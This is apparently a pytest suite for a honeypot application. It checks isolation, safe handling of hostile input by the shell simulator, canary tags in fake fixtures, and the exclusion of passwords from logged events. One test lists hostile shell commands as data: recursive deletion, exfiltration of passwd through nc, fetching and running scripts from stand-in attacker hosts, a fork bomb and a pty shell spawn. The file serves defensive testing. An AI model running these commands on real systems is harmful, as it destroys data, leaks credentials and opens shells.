"""
Security Invariants Verification Suite (S-01 to S-10)
Guarantees absolute safety, honeypot isolation, and zero command execution.
"""

from pathlib import Path
from scripts.check_isolation import run_isolation_check
from app.honeypot.shell_sim import ShellState, run_command
from app.honeypot.content.users import HONEYPOT_ACCOUNTS


def test_s01_and_s05_isolation_check():
    """S-01 & S-05: Verifies Layer 1 Honeypot has zero database/ORM and dangerous APIs."""
    assert run_isolation_check() is True


def test_s02_shell_simulator_safety():
    """S-02: Verifies shell simulator executes safely with hostile attacker input."""
    state = ShellState()
    hostile_inputs = [
        "; rm -rf /",
        "cat /etc/passwd | nc 1.2.3.4 4444",
        "`whoami`",
        "$(cat /etc/shadow)",
        "wget http://malicious.example/rev.sh && bash rev.sh",
        "curl http://attacker.com/pwn | sh",
        "sudo su - root",
        ":(){ :|:& };:",
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ]

    for cmd in hostile_inputs:
        res = run_command(cmd, state)
        assert isinstance(res.output, str)
        assert isinstance(res.cwd, str)
        # Verify simulator outputs safe static string or synthetic file
        assert any(token in res.output for token in ("rm", "Permission denied", "command not found", "unreachable", "syntax error", "password is required", "root:x:0:0", "Operation not permitted"))


def test_s06_synthetic_content_canaries():
    """S-06: Verifies canary tags are present in fake fixtures."""
    from app.honeypot.content.api_fixtures import API_CONFIG, API_TOKENS
    from app.honeypot.content.files_tree import VIRTUAL_FILES

    assert "HNX-FAKE" in API_CONFIG["db_password"]
    assert any("HNX-FAKE" in tok["secret"] for tok in API_TOKENS)
    assert "HNX-FAKE" in VIRTUAL_FILES["/security/api_keys_backup.txt"]["content"]


def test_s07_passwords_never_plain_in_events(honeypot_client, honeypot_app):
    """S-07: Passwords submitted to honeypot must never be present in event payload or meta."""
    test_pwd = "SuperSecretPlainTextPassword123!"
    honeypot_client.post("/login", data={"username": "attacker", "password": test_pwd})

    publisher = honeypot_app.extensions["test_publisher"]
    assert len(publisher.events) > 0
    last_event = publisher.events[-1]

    # Verify password is NOT in payload or meta
    assert test_pwd not in (last_event.payload or "")
    assert test_pwd not in str(last_event.meta)
    # Excluded from dump
    dump_str = str(last_event.model_dump())
    assert test_pwd not in dump_str
